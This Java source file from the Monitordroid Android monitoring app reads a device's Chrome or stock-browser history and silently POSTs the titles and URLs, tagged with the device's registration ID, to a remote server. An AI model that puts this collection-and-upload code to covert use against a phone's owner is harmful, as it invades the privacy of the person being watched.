/**
 * Copyright (C) 2015 Monitordroid Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author Tyler Butler
 **/

package com.monitordroid.app;

import static com.monitordroid.app.CommonUtilities.BROWSER_HISTORY_URL;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import com.google.android.gcm.GCMRegistrar;


import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Browser;
import android.util.Log;

public class BrowserHistory {
	
	/**
	 * Gets the default browser and the history for that browser then executes an AsyncTask to post it to the web server
	 */
	public void getHistory(Context context) {
		String regId = GCMRegistrar.getRegistrationId(context);
		Long initTime = System.currentTimeMillis();
		String output = "";
		String defaultBrowser = getDefaultBrowser(context);
		
		//This function only works with Chrome and the default Android browser
		if (defaultBrowser.equals("com.android.chrome") || defaultBrowser.equals("android") || defaultBrowser.equals("com.android.browser")) {
			output = fetchFromBrowser(context, defaultBrowser);
		}
		//If unsupported broswer is detected, show error message
		else {
			output = "Error fetching browser history. Browser " + defaultBrowser + " is not supported.";
		}
		Long finTime = System.currentTimeMillis();
		Long diff = finTime - initTime;
		Log.i("Finished in: ", Long.toString(diff) + "ms");
		new MyAsyncTask().execute(output, regId);
	}
	
	/**
	 * Fetches the history of the specified browser and returns it in String form. 
	 * Efficiency notes: In O(n), but browser history can be large and it is fetched all at once so it may take quite a while.
	 * @param browser - The package name of the browser to fetch history for. Currently only supports "android" 
	 * 					and "com.android.browser" for the default browser, and "com.android.chrome." for Chrome. 
	 */
	private String fetchFromBrowser(Context context, String browser) {
		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,Browser.BookmarkColumns.URL };
		Cursor mCur;
		String output = "";
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
		
		if (browser.equals("com.android.chrome")) {
			Log.i("Fetching for: ", "Chrome");
			Uri uriCustom = Uri.parse("content://com.android.chrome.browser/bookmarks");			
		    mCur = context.getContentResolver().query(uriCustom, proj, sel, null, null);
		}
		else {
			Log.i("Fetching for: ", "Android browser");
			mCur = context.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
		}
		
		//Browser history begins at the oldest link. We want to see the newest visited link at the top of the page, so begin at the last (newest) link
		mCur.moveToLast();
		
		String title = "";
		String url = "";
	
		if (mCur.moveToLast() && mCur.getCount() > 0) {
		    boolean cont = true;
		    //Only store up to 64kb of data for database conservation purposes
		    while (mCur.isBeforeFirst() == false && cont && output.length() < 64000) {
		        title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
		        url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
		        // Do something with title and url
		        output += "\n" + title + ": " + url + "\n";
		        
		        mCur.moveToPrevious();
		    }
		}
		if (output.equals("")) {
			output = "Error fetching browser history: no history to fetch";
		}
		mCur.close();
		return output;
	}
	
	/**
	 * Returns the package name of the device's default web browser
	 */
	private String getDefaultBrowser(Context context) {
		Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse("http://"));  
		ResolveInfo resolveInfo = context.getPackageManager().resolveActivity(browserIntent,PackageManager.MATCH_DEFAULT_ONLY);
		String browser = resolveInfo.activityInfo.packageName;
		Log.i("Default browser: ", browser);
		return browser;
	}
	
	
	//Posts UTF-8 Text data to the server
	private class MyAsyncTask extends AsyncTask<String, String, Double>{
		 
		@Override
		protected Double doInBackground(String... params) {
		postData(params[0], params[1]);
		return null;
		}
		 
		protected void onPostExecute(Double result){

		}

		public void postData(String browserHistory, String regId) {
		HttpClient httpclient = new DefaultHttpClient();
		String url = BROWSER_HISTORY_URL;
		HttpPost httppost = new HttpPost(url);

		 
		try {
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			nameValuePairs.add(new BasicNameValuePair("browserHistory", browserHistory));
			nameValuePairs.add(new BasicNameValuePair("regName", regId));
			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
			httpclient.execute(httppost);
		 
		} 
		catch (ClientProtocolException e) {
			} 
		catch (IOException e) {
			}
		
	}
		 
		
	}	

}
